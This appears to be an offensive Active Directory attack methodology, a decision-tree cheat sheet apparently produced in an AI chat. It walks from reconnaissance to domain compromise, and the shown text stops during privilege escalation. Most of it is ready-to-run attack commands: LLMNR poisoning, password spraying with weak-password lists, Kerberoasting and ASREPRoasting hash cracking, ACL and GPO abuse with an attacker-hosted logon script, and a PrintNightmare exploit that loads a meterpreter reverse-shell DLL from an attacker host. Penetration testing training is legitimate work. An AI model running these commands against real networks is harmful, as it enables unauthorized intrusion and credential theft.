# Active Directory Attack Methodology

## A Complete Decision Tree from Enumeration to Domain Compromise

---

> **Usage:** Follow each phase sequentially. At every decision point, choose the branch that matches your current access level and environment. Every tool, command, and scenario from the source notes is covered.

---

## Table of Contents

1. [Phase 1 — External Reconnaissance (Unauthenticated)](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#phase-1--external-reconnaissance-unauthenticated)
2. [Phase 2 — Internal Network Discovery (Unauthenticated)](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#phase-2--internal-network-discovery-unauthenticated)
3. [Phase 3 — Gaining Initial Credentials](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#phase-3--gaining-initial-credentials)
4. [Phase 4 — Credentialed Enumeration](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#phase-4--credentialed-enumeration)
5. [Phase 5 — Privilege Escalation Paths](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#phase-5--privilege-escalation-paths)
6. [Phase 6 — Lateral Movement](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#phase-6--lateral-movement)
7. [Phase 7 — Domain Compromise](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#phase-7--domain-compromise)
8. [Phase 8 — Cross-Trust & Forest Attacks](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#phase-8--cross-trust--forest-attacks)
9. [Phase 9 — Post-Compromise & Persistence](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#phase-9--post-compromise--persistence)
10. [Defensive Evasion Notes](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#defensive-evasion-notes)
11. [Quick Reference — Tool Index](https://claude.ai/chat/59d87614-b6bc-40d4-8833-6affb50a9219#quick-reference--tool-index)

---

## Phase 1 — External Reconnaissance (Unauthenticated)

> **Goal:** Gather publicly available information about the target organisation before touching any internal infrastructure.

```
START: You have a company name and/or domain
│
├─► Identify IP space and ASN
│     Tools: BGP Toolkit (bgp.he.net), ARIN, RIPE, IANA
│     Command: Search domain name on bgp.he.net
│     Collect: ASN, netblocks, hosting providers, cloud presence
│
├─► DNS Enumeration
│     Tools: nslookup, viewdns.info, domaintools.com, PTRArchive
│     Commands:
│       nslookup ns1.<target>.com
│       nslookup ns2.<target>.com
│     Collect: nameservers, MX records, A/AAAA records, subdomains
│
├─► WHOIS / Domain Registration
│     Tools: ICANN lookup, domaintools
│     Collect: registrant, admin email format, org name
│
├─► Social Media & Public Web
│     Tools: LinkedIn, Twitter, Facebook, company website
│     Targets:
│       - Job postings → reveal software, AD version, tools in use
│       - Employee names → derive username format (e.g. first.last)
│       - Published documents → metadata leaks internal usernames
│
├─► File Metadata Mining
│     Dork: filetype:pdf inurl:<target>.com
│     Dork: intext:"@<target>.com" inurl:<target>.com
│     Tool: ExifTool to extract metadata from downloaded docs
│     Collect: Author fields, internal paths, software versions
│
├─► Username Harvesting
│     Tool: linkedin2username
│     Purpose: Generate username wordlists from LinkedIn (flast, first.last, f.last)
│     Feed into: Kerbrute userenum, password spraying
│
├─► Breach Data
│     Tools: HaveIBeenPwned, Dehashed
│     Command: python3 dehashed.py -q <target>.local -p
│     Collect: Cleartext passwords, hashes, usernames from breaches
│     Use for: Password spraying, credential stuffing on VPN/OWA/Citrix
│
└─► Cloud & Dev Storage
      Tools: Greyhat Warfare (buckets.grayhatwarfare.com), Trufflehog, GitHub search
      Targets: S3 buckets, Azure Blob, public GitHub repos
      Look for: Hardcoded credentials, config files, connection strings
```

**Decision after Phase 1:**

- Got username format? → Feed into Phase 3 spraying/enum
- Got breach credentials? → Test immediately against exposed services (VPN, OWA, Citrix, RDS)
- Got nothing useful? → Proceed to Phase 2 from inside the network

---

## Phase 2 — Internal Network Discovery (Unauthenticated)

> **Goal:** Map the internal network, identify hosts, services, and AD infrastructure without valid domain credentials.

### 2.1 — Passive Host Discovery

```
START: You are on the internal network with no credentials
│
├─► Passive traffic analysis
│     Tools: Wireshark, tcpdump
│     Command: sudo -E wireshark
│     Command: sudo tcpdump -i ens224
│     Save: tcpdump -i ens224 -w capture.pcap
│     Observe:
│       - ARP requests → reveal live host IPs
│       - MDNS queries → reveal hostnames (e.g. ACADEMY-EA-WEB01.local)
│       - NBNS/LLMNR traffic → reveals naming conventions
│
├─► Responder in Analyze Mode (passive, no poisoning)
│     Command: sudo responder -I ens224 -A
│     Observe: NBT-NS, BROWSER, LLMNR requests
│     Collect: Hostnames, IPs, domain names — without sending any packets
│
└─► Document: Build initial host list from ARP + MDNS + Responder output
```

### 2.2 — Active Host Discovery

```
├─► ICMP Sweep with fping
│     Command: fping -asgq 172.16.5.0/23
│     Flags: -a (alive), -s (stats), -g (generate list), -q (quiet)
│     Output: List of live IPs
│
├─► Nmap — Service Discovery
│     Quick sweep: sudo nmap -v -A -iL hosts.txt -oN host-enum
│     Save all formats: sudo nmap -v -A -iL hosts.txt -oA scan_results
│     Key ports to identify:
│       53/tcp  → DNS (likely DC)
│       88/tcp  → Kerberos (DC confirmed)
│       135/tcp → RPC
│       139/tcp → NetBIOS
│       389/tcp → LDAP (DC confirmed)
│       445/tcp → SMB
│       464/tcp → Kpasswd (DC)
│       636/tcp → LDAPS
│       3268/tcp → GC LDAP
│       3389/tcp → RDP
│       5985/tcp → WinRM
│       1433/tcp → MSSQL
│
│     From RDP banner (3389), grab:
│       NetBIOS_Domain_Name, DNS_Domain_Name, NetBIOS_Computer_Name
│       → Identifies Domain Controllers immediately
│
└─► Output analysis:
      - Found ports 53+88+389+445 on same host → That is the Domain Controller
      - Found Windows Server 2008/2003/XP → Note for legacy exploit potential
      - Found MSSQL → Note for SQL admin attack path
      - Found IIS 7.5 → Note for EternalBlue / MS08-067 potential
```

### 2.3 — Unauthenticated SMB/RPC Enumeration

```
├─► Check for SMB NULL Sessions
│     Command: rpcclient -U "" -N <DC_IP>
│     If connected, run:
│       rpcclient $> querydominfo        ← domain info, user count
│       rpcclient $> getdompwinfo        ← password policy
│       rpcclient $> enumdomusers        ← all domain users + RIDs
│       rpcclient $> enumdomgroups       ← all domain groups
│
├─► enum4linux (wraps rpcclient, net, smbclient)
│     Command: enum4linux -P <DC_IP>     ← password policy only
│     Command: enum4linux -U <DC_IP>     ← user list
│     Command: enum4linux -a <DC_IP>     ← full enumeration
│     Filter users: enum4linux -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
│
├─► enum4linux-ng (Python rewrite, cleaner output)
│     Command: enum4linux-ng -P <DC_IP> -oA ilfreight   ← saves JSON/YAML
│     Command: enum4linux-ng -A <DC_IP>
│
├─► CrackMapExec — NULL session check
│     Command: crackmapexec smb <DC_IP> --users   ← may work without creds
│     Command: crackmapexec smb <DC_IP> --pass-pol
│
└─► LDAP Anonymous Bind check
      Command: ldapsearch -h <DC_IP> -x -b "DC=domain,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
      If successful → full LDAP dump possible unauthenticated
      Tool: windapsearch.py --dc-ip <DC_IP> -u "" -U   ← enumerate users anonymously
```

### 2.4 — Username Enumeration Without Credentials

```
├─► Kerbrute — Kerberos pre-auth username enumeration
│     Why: Does NOT trigger Event ID 4625 (logon failure)
│     Setup:
│       git clone https://github.com/ropnop/kerbrute
│       sudo make all
│       sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
│
│     Command: kerbrute userenum -d DOMAIN.LOCAL --dc <DC_IP> jsmith.txt -o valid_users.txt
│     Wordlists: 
│       /opt/statistically-likely-usernames/jsmith.txt (48,705 entries)
│       linkedin2username output
│       Combination of both
│
│     ► If ASREPRoastable user found during enum → immediately grab hash:
│         kerbrute will auto-dump AS-REP hash for accounts with pre-auth disabled
│
└─► Decision after username enumeration:
      Got valid usernames → proceed to Phase 3 (credential attacks)
      Got AS-REP hash → crack offline with Hashcat -m 18200 → credentials
      Got nothing → try broader wordlists, LinkedIn scraping
```

---

## Phase 3 — Gaining Initial Credentials

> **Goal:** Obtain valid domain user credentials by any means. Even low-privilege user access unlocks most enumeration.

### 3.1 — LLMNR/NBT-NS Poisoning (from Linux)

```
SCENARIO: You are on the internal network, no credentials
WHEN TO USE: Active users on the network making name resolution requests
RISK: Noisy — generates traffic. Get client approval for production networks.

├─► Start Responder
│     Command: sudo responder -I ens224
│     Optional flags:
│       -wf     ← start WPAD rogue proxy (captures HTTP auth)
│       -v      ← verbose (more output)
│       -A      ← analyze only (no poisoning — use for recon first)
│
│     Required open ports: UDP 137,138,53, UDP/TCP 389, TCP 80,135,139,445, etc.
│
│     Hashes saved to: /usr/share/responder/logs/
│     Format: SMB-NTLMv2-SSP-<victim_IP>.txt
│
├─► Crack NTLMv2 Hashes
│     Command: hashcat -m 5600 captured_hashes /usr/share/wordlists/rockyou.txt
│     If NTLMv1: hashcat -m 5500
│     Check hash type: https://hashcat.net/wiki/doku.php?id=example_hashes
│
├─► Decision tree after capture:
│     Got NTLMv2 hash → crack offline
│       ├─► Cracked → cleartext password → use for auth anywhere
│       └─► Not cracked → consider SMB relay (ntlmrelayx.py) instead
│
└─► Alternative: Run in background, pivot to other attacks simultaneously
      Keep Responder running in tmux, proceed with password spraying in another pane
```

### 3.2 — LLMNR/NBT-NS Poisoning (from Windows — Inveigh)

```
SCENARIO: You are operating from a Windows host, no Linux available

├─► PowerShell version (legacy, still useful)
│     Import-Module .\Inveigh.ps1
│     Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
│
├─► C# version (InveighZero — preferred, maintained)
│     .\Inveigh.exe
│     Interactive console: press ESC
│     Commands inside console:
│       GET NTLMV2            ← all NTLMv2 hashes captured
│       GET NTLMV2UNIQUE      ← deduplicated
│       GET NTLMV2USERNAMES   ← usernames + source IPs
│       STOP                  ← stop capture
│
└─► Crack hashes same as Linux method above
```

### 3.3 — Password Spraying

> **CRITICAL:** Know the password policy BEFORE spraying. Default lockout is 5 bad attempts. Spray at most 2-3 passwords, then wait > lockout duration.

```
STEP 1 — Obtain Password Policy
│
├─► Unauthenticated (NULL session):
│     rpcclient -U "" -N <DC_IP> → getdompwinfo
│     enum4linux -P <DC_IP>
│     ldapsearch -h <DC_IP> -x -b "DC=domain,DC=LOCAL" -s sub "*" | grep pwdHistoryLength
│
├─► Authenticated:
│     crackmapexec smb <DC_IP> -u <user> -p <pass> --pass-pol
│     net accounts /domain                              (from Windows)
│     Import-Module .\PowerView.ps1; Get-DomainPolicy   (from Windows)
│
│     Key values to extract:
│       Minimum password length
│       Lockout threshold (how many bad attempts before lockout)
│       Lockout duration (auto-unlock time)
│       Lockout observation window (reset timer)
│
STEP 2 — Build Target User List
│
├─► From NULL session: enum4linux / rpcclient enumdomusers
├─► From LDAP anon bind: ldapsearch / windapsearch
├─► From Kerbrute enum: valid_users.txt
├─► From LinkedIn: linkedin2username output
└─► From CME (authenticated): crackmapexec smb <DC_IP> -u <user> -p <pass> --users

STEP 3 — Choose Spray Method

├─► FROM LINUX:
│   
│   ├─► rpcclient one-liner (bash loop)
│   │     for u in $(cat valid_users.txt); do
│   │       rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC_IP> | grep Authority
│   │     done
│   │
│   ├─► Kerbrute (stealthy — no 4625 events)
│   │     kerbrute passwordspray -d DOMAIN.LOCAL --dc <DC_IP> valid_users.txt Welcome1
│   │
│   └─► CrackMapExec (fast, shows badpwdcount)
│         crackmapexec smb <DC_IP> -u valid_users.txt -p Password123 | grep "+"
│         Validate hit: crackmapexec smb <DC_IP> -u <user> -p <pass>
│
├─► FROM WINDOWS (domain-joined):
│   
│   ├─► DomainPasswordSpray.ps1 (auto-generates user list, respects policy)
│   │     Import-Module .\DomainPasswordSpray.ps1
│   │     Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
│   │
│   └─► Rubeus (Kerberos-based, generates fewer NTLM auth events)
│         .\Rubeus.exe brute /password:Welcome1 /noticket
│
├─► Common weak passwords to try (in order):
│     Welcome1, Password1, Password123, Spring2024, Fall2024
│     CompanyName1, CompanyName123, SeasonYear (e.g. Summer2023)
│     Welcome2024, P@ssw0rd, Passw0rd1
│
└─► Decision after spray:
      Got credentials → proceed to Phase 4
      Got local admin hash → try CME --local-auth spray across subnet
      Nothing → try LLMNR poisoning, longer wait, different passwords
```

### 3.4 — Local Admin Password Re-use Spray

```
SCENARIO: You have a local admin NTLM hash from one host

Command: sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <NTLM_hash> | grep "+"
Flag: --local-auth  ← REQUIRED — prevents domain lockouts

Output: Hosts showing (Pwn3d!) have same local admin password
Use for: PSExec / WinRM access → pivot to hunt domain accounts in memory
```

### 3.5 — Credential Extraction from Exposed Services

```
├─► GPP Passwords (SYSVOL)
│     Look for: \\<DC>\SYSVOL\<domain>\Policies\*\Groups.xml
│     Contains: cpassword attribute (AES-256, but Microsoft published the key)
│     Tool: gpp-decrypt <cpassword_value>
│     CME module: crackmapexec smb <DC_IP> -u <user> -p <pass> -M gpp_password
│
├─► GPP Autologon (Registry.xml)
│     CME module: crackmapexec smb <DC_IP> -u <user> -p <pass> -M gpp_autologin
│     Contains: plaintext autologon credentials
│
├─► Passwords in Description Fields
│     PowerView: Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
│
├─► SYSVOL Script hunting
│     Browse: \\<DC>\SYSVOL\<domain>\scripts\
│     Look for .bat, .vbs, .ps1 files containing passwords
│
└─► LDAP Credential Sniffing
      Technique: Change printer/device LDAP server IP to your attack host
      Setup: netcat -lvnp 389
      Device will send LDAP bind request with cleartext credentials
```

---

## Phase 4 — Credentialed Enumeration

> **Goal:** With valid (even low-privilege) domain credentials, map the entire AD environment to identify attack paths.

### 4.1 — BloodHound Collection (Recommended First Step)

```
ALWAYS RUN BLOODHOUND FIRST — it maps everything visually and reveals attack paths

FROM LINUX:
│   sudo bloodhound-python -u 'username' -p 'password' -ns <DC_IP> -d domain.local -c all
│   Output: JSON files (computers, users, groups, domains)
│   Zip: zip -r domain_bh.zip *.json
│   Upload to BloodHound GUI

FROM WINDOWS (SharpHound):
│   .\SharpHound.exe -c All --zipfilename DOMAIN
│   Output: Zip file → exfiltrate → upload to BloodHound GUI

BloodHound GUI — Key queries to run immediately:
├─► Analysis tab:
│     "Find Shortest Paths to Domain Admins"          ← most important
│     "Find Principals with DCSync Rights"
│     "Find Computers where Domain Users are Local Admin"
│     "Find Workstations where Domain Users can RDP"
│     "Find Servers where Domain Users can RDP"
│     "Shortest Paths to Unconstrained Delegation Systems"
│     "Find Computers with Unsupported Operating Systems"
│
├─► Node Info → for any user you control:
│     Outbound Control Rights → what can this user do?
│     First Degree Object Control → direct ACE rights
│     Transitive Object Control → full attack chain length
│
└─► Custom Cypher queries:
      WinRM access:
        MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
        MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

      SQL Admin:
        MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
        MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

### 4.2 — CrackMapExec Enumeration

```
FROM LINUX with credentials:

├─► Domain users (with badpwdcount — filter near-lockout accounts)
│     crackmapexec smb <DC_IP> -u <user> -p <pass> --users
│
├─► Domain groups
│     crackmapexec smb <DC_IP> -u <user> -p <pass> --groups
│
├─► Logged-on users (find where admins are active)
│     crackmapexec smb <target_IP> -u <user> -p <pass> --loggedon-users
│     Look for: DA/EA accounts logged into non-DC hosts → credential theft target
│
├─► Share enumeration
│     crackmapexec smb <DC_IP> -u <user> -p <pass> --shares
│
├─► Spider shares for sensitive files
│     crackmapexec smb <DC_IP> -u <user> -p <pass> -M spider_plus --share 'Department Shares'
│     Results: /tmp/cme_spider_plus/<IP>.json
│
└─► Password policy
      crackmapexec smb <DC_IP> -u <user> -p <pass> --pass-pol
```

### 4.3 — PowerView Enumeration (from Windows)

```
Import-Module .\PowerView.ps1   (or load from memory)

Key functions:

├─► Domain information
│     Get-Domain
│     Get-DomainController
│     Get-DomainPolicy
│
├─► User enumeration
│     Get-DomainUser -Identity <username> -Domain domain.local | Select-Object -Property name,samaccountname,description,memberof,pwdlastset,lastlogontimestamp,admincount,useraccountcontrol
│     Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName   ← Kerberoast targets
│     Get-DomainUser -PreauthNotRequired                                     ← ASREPRoast targets
│     Get-DomainUser -UACFilter PASSWD_NOTREQD                              ← no password required
│
├─► Group enumeration
│     Get-DomainGroup -Identity "Domain Admins" | select name,member
│     Get-DomainGroupMember -Identity "Domain Admins" -Recurse              ← nested membership
│     Get-DomainGroupMember -Identity "Help Desk Level 1"
│
├─► Computer enumeration
│     Get-DomainComputer | select dnshostname,operatingsystem,operatingsystemversion
│
├─► Trust enumeration
│     Get-DomainTrust
│     Get-DomainTrustMapping
│     Get-ForestTrust
│     Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL           ← foreign group members
│
├─► ACL enumeration (CRITICAL — map privilege escalation via ACEs)
│     $sid = Convert-NameToSid <username>
│     Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
│     Find-InterestingDomainAcl                                             ← broad sweep (slow)
│
├─► SPN enumeration (Kerberoasting)
│     Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\spn_hashes.csv
│
└─► Share/file hunting
      Find-DomainShare
      Find-InterestingDomainShareFile
      Find-LocalAdminAccess                   ← find hosts where current user is local admin
      Test-AdminAccess -ComputerName <host>
```

### 4.4 — Active Directory PowerShell Module (Built-in — Stealthier)

```
Import-Module ActiveDirectory   (pre-installed on domain hosts)

├─► Domain info
│     Get-ADDomain
│     Get-ADTrust -Filter *
│
├─► User/group info
│     Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   ← Kerberoast
│     Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl         ← reversible enc
│     Get-ADGroup -Filter * | select name
│     Get-ADGroupMember -Identity "Backup Operators"
│
└─► Trust info
      Get-ADTrust -Filter *
      Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL" | select objectsid
```

### 4.5 — SMBMap Enumeration

```
├─► Check share permissions
│     smbmap -u <user> -p <pass> -d DOMAIN.LOCAL -H <DC_IP>
│
├─► Recursive directory listing
│     smbmap -u <user> -p <pass> -d DOMAIN.LOCAL -H <DC_IP> -R 'Department Shares' --dir-only
│
└─► Download files
      smbmap -u <user> -p <pass> -d DOMAIN.LOCAL -H <DC_IP> --download 'path\to\file'
```

### 4.6 — rpcclient Targeted Enumeration

```
rpcclient -U "<user>%<pass>" <DC_IP>

├─► Enumerate users with RID cycling
│     enumdomusers                         ← all users + RIDs
│     queryuser 0x457                      ← query specific RID (hex)
│     querygroup 0x200                     ← query group by RID
│
├─► Password policy
│     getdompwinfo
│     querydominfo
│
└─► Printer enumeration (SpoolSS / PrintNightmare check)
      enumprinters
```

### 4.7 — Snaffler (Credential Hunting in Shares)

```
FROM WINDOWS (domain-joined):
.\Snaffler.exe -s -d domain.local -o snaffler.log -v data

Color coding:
  Red    = highest interest (keys, .mdf, .sqldump, .keypair)
  Black  = moderate interest (.kdb, .kwallet, .ppk, .psafe3)
  Green  = accessible shares

Look for: web.config, connection strings, SSH keys, password files
```

### 4.8 — adidnsdump (DNS Zone Enumeration)

```
adidnsdump -u domain\\user ldap://<DC_IP>
adidnsdump -u domain\\user ldap://<DC_IP> -r    ← resolve unknown records

Output: records.csv
Purpose: Finds hosts with non-descriptive names, discovers hidden internal hosts
```

### 4.9 — Security Controls Enumeration

```
FROM WINDOWS — always check defenses before running loud tools:

├─► Windows Defender status
│     Get-MpComputerStatus | select RealTimeProtectionEnabled, AMEngineVersion
│     sc query windefend        (from CMD)
│
├─► AppLocker policy
│     Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
│     Look for: PowerShell blocks, executable restrictions
│
├─► PowerShell Constrained Language Mode
│     $ExecutionContext.SessionState.LanguageMode
│     If: ConstrainedLanguage → use .NET directly or SharpView instead
│
├─► Firewall status
│     netsh advfirewall show allprofiles
│
└─► Logged-in users (avoid stepping on admins)
      qwinsta
      klist   ← cached Kerberos tickets
```

---

## Phase 5 — Privilege Escalation Paths

> **Goal:** Elevate from standard domain user to Domain Admin (or equivalent).

### 5.1 — Decision Tree: Which Attack to Use

```
YOU HAVE: Standard domain user credentials
│
├─► Run BloodHound → check "Outbound Control Rights" for your user
│     Found ACL attack path? → 5.2 ACL Abuse
│     Found Kerberoastable DA accounts? → 5.3 Kerberoasting
│     Found DONT_REQ_PREAUTH accounts? → 5.4 ASREPRoasting
│     Found misconfigured GPO you control? → 5.5 GPO Abuse
│     Found LAPS readable? → 5.6 LAPS Abuse
│
├─► Check for vulnerable services
│     MS14-068 (unpatched Kerberos)? → 5.7
│     PrintNightmare (spooler running)? → 5.8
│     noPac / SamAccountName spoofing? → 5.9
│     PetitPotam (AD CS present)? → 5.10
│
└─► Check group memberships
      Member of Backup Operators, Account Operators, Exchange Windows Permissions?
      → Those groups grant privileged attack paths
```

### 5.2 — ACL Abuse

```
DISCOVERY:
  $sid = Convert-NameToSid <your_username>
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ATTACK SCENARIOS BY ACE TYPE:

├─► ForceChangePassword (User-Force-Change-Password)
│     Target: Another user whose password you can reset
│     Attack:
│       $SecPassword = ConvertTo-SecureString '<your_pass>' -AsPlainText -Force
│       $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\youuser', $SecPassword)
│       $NewPass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
│       Set-DomainUserPassword -Identity <target_user> -AccountPassword $NewPass -Credential $Cred -Verbose
│
├─► GenericWrite (over user)
│     Attack option 1 — Set SPN and Kerberoast:
│       Set-DomainObject -Credential $Cred2 -Identity <target_user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
│       .\Rubeus.exe kerberoast /user:<target_user> /nowrap
│       hashcat -m 13100 hash.txt wordlist.txt
│       Clean up: Set-DomainObject -Credential $Cred2 -Identity <target_user> -Clear serviceprincipalname -Verbose
│
│     Attack option 2 — logon script abuse (adds persistence)
│       Set-DomainObject -Identity <target_user> -SET @{scriptpath='\\attacker\share\evil.ps1'}
│
├─► GenericWrite (over group)
│     Attack: Add yourself to the group
│       Add-DomainGroupMember -Identity '<target_group>' -Members '<your_user>' -Credential $Cred -Verbose
│       Verify: Get-DomainGroupMember -Identity '<target_group>' | Select MemberName
│       Clean up: Remove-DomainGroupMember -Identity '<target_group>' -Members '<your_user>' -Credential $Cred
│
├─► AddSelf
│     Attack: Add yourself to the group (same as GenericWrite over group)
│
├─► GenericAll (over user)
│     Full control — can do all of the above
│     Most powerful → force password change or targeted Kerberoasting
│
├─► GenericAll (over group)
│     Add any user to the group
│
├─► WriteDACL (over domain object)
│     Grant yourself DCSync rights:
│       Add-DomainObjectACL -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <your_user> -Rights DCSync
│       Then run DCSync (see Phase 7)
│
├─► WriteOwner
│     Take ownership of the object first:
│       Set-DomainObjectOwner -Identity <target> -OwnerIdentity <your_user>
│     Then grant yourself GenericAll:
│       Add-DomainObjectACL -TargetIdentity <target> -PrincipalIdentity <your_user> -Rights All
│
└─► CLEANUP CHECKLIST (always do this):
      1. Remove fake SPN (if set)
      2. Remove yourself from groups (if added)
      3. Reset passwords (if changed)
      4. Document ALL changes in notes
```

### 5.3 — Kerberoasting

```
CONCEPT: Request TGS tickets for SPN accounts → crack offline → get cleartext password

DISCOVERY:
  setspn.exe -Q */*                                          (Windows, built-in)
  Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName    (PowerView)
  .\Rubeus.exe kerberoast /stats                             (shows encryption types)

ATTACK FROM LINUX:
├─► List SPN accounts (no ticket request yet):
│     GetUserSPNs.py -dc-ip <DC_IP> DOMAIN.LOCAL/<user>:<pass>
│
├─► Request all TGS tickets:
│     GetUserSPNs.py -dc-ip <DC_IP> DOMAIN.LOCAL/<user>:<pass> -request
│
├─► Request specific user's ticket:
│     GetUserSPNs.py -dc-ip <DC_IP> DOMAIN.LOCAL/<user>:<pass> -request-user sqldev -outputfile sqldev_tgs
│
└─► Crack:
      hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

ATTACK FROM WINDOWS:
├─► Rubeus — all tickets (filter by admincount=1 for DA targets first):
│     .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
│     .\Rubeus.exe kerberoast /user:<target> /nowrap
│
├─► Rubeus — force RC4 (faster to crack than AES):
│     .\Rubeus.exe kerberoast /tgtdeleg /nowrap
│     NOTE: Does not work against Server 2019 DCs
│
├─► PowerView — export to CSV:
│     Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\spn_hashes.csv
│
└─► Semi-manual (Mimikatz):
      Add-Type -AssemblyName System.IdentityModel
      New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host:1433"
      mimikatz # kerberos::list /export
      python2.7 kirbi2john.py ticket.kirbi → crack with hashcat -m 13100

ENCRYPTION TYPE DECISION:
  RC4 ($krb5tgs$23$*) → hashcat -m 13100 → fast cracking
  AES256 ($krb5tgs$18$*) → hashcat -m 19700 → 25x slower
  Strategy: If AES, use /tgtdeleg to downgrade to RC4 (pre-2019 DCs only)

AFTER CRACKING:
  Test creds: crackmapexec smb <DC_IP> -u <cracked_user> -p <cracked_pass>
  If DA → proceed to Phase 7 (Domain Compromise)
```

### 5.4 — ASREPRoasting

```
CONCEPT: Accounts with "Do not require Kerberos pre-auth" → AS-REP hash offline crackable

DISCOVERY:
  Get-DomainUser -PreauthNotRequired | select samaccountname          (PowerView)
  Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth}

ATTACK FROM LINUX:
├─► Using GetNPUsers.py (Impacket):
│     GetNPUsers.py DOMAIN.LOCAL/ -dc-ip <DC_IP> -no-pass -usersfile valid_users.txt
│     GetNPUsers.py DOMAIN.LOCAL/<user>:<pass> -dc-ip <DC_IP> -request   ← with creds, all targets
│
└─► Crack:
      hashcat -m 18200 asrep_hashes /usr/share/wordlists/rockyou.txt

ATTACK FROM WINDOWS:
├─► Rubeus:
│     .\Rubeus.exe asreproast /user:<target> /nowrap /format:hashcat
│     .\Rubeus.exe asreproast /nowrap    ← all ASREPRoastable users
│
└─► Kerbrute (auto-grabs AS-REP during username enum if pre-auth disabled):
      kerbrute userenum -d domain.local --dc <DC_IP> userlist.txt

NOTE: If you have GenericWrite or GenericAll over an account, you can:
  1. Enable DONT_REQ_PREAUTH on the account
  2. Request the AS-REP
  3. Crack offline
  4. Disable the flag again
```

### 5.5 — GPO Abuse

```
DISCOVERY:
  Get-DomainGPO | select displayname
  $sid = Convert-NameToSid "Domain Users"
  Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
  Convert GUID: Get-GPO -Guid <GUID>

  BloodHound: check if your user/group has edit rights over any GPO

ATTACK (if you have write rights over a GPO):
  Tool: SharpGPOAbuse
  .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <your_user> --GPOName "<GPO_Name>"
  .\SharpGPOAbuse.exe --AddComputerScript --ScriptName evil.bat --ScriptContents "<command>" --GPOName "<GPO_Name>"

  WARNING: GPO changes affect ALL computers/users in the linked OU
  Target specific hosts: use --ComputerName flag where possible
```

### 5.6 — LAPS Abuse

```
DISCOVERY:
  Find-LAPSDelegatedGroups                      (LAPSToolkit)
  Find-AdmPwdExtendedRights                     (LAPSToolkit)
  Get-LAPSComputers                             (LAPSToolkit — if you have read rights)

  Check who can read LAPS passwords:
    Get-DomainObjectACL -Identity <computer> -ResolveGUIDs | ? {$_.ObjectAceType -like "*ms-Mcs-AdmPwd*"}

ATTACK:
  If your user is in a group with LAPS read rights:
    Get-LAPSComputers                           → shows plaintext local admin password
    crackmapexec smb <target_IP> -u administrator -p '<LAPS_password>'
```

### 5.7 — MS14-068 (Legacy — unpatched Kerberos)

```
AFFECTED: Windows Server 2003/2008/2008 R2/2012/2012 R2 (unpatched)
IMPACT: Standard user → Domain Admin via forged PAC

Tool: PyKEK (Python Kerberos Exploitation Kit)
  python ms14-068.py -u <user>@domain.com -p <pass> -s <user_SID> -d <DC_IP>
  mimikatz # kerberos::ptc TGT_<user>@domain.com.ccache
  klist → verify ticket
  Access DC: dir \\DC\C$
```

### 5.8 — PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

```
CHECK: Is spooler running?
  rpcclient -U "<user>%<pass>" <DC_IP> → enumprinters
  OR: rpcdump.py @<target_IP> | egrep 'MS-RPRN|MS-PAR'

ATTACK FROM LINUX:
  Step 1: Generate DLL payload
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=8080 -f dll > evil.dll

  Step 2: Host on SMB share
    sudo smbserver.py -smb2support CompData /path/to/dll/

  Step 3: Start listener (Metasploit multi/handler)
    use exploit/multi/handler
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST <attacker_IP>; set LPORT 8080; run

  Step 4: Exploit
    sudo python3 CVE-2021-1675.py DOMAIN.LOCAL/<user>:<pass>@<target_IP> '\\<attacker_IP>\CompData\evil.dll'

  Result: SYSTEM shell on target

NOTE: Use pip3 uninstall impacket; then install cube0x0's fork for this exploit
```

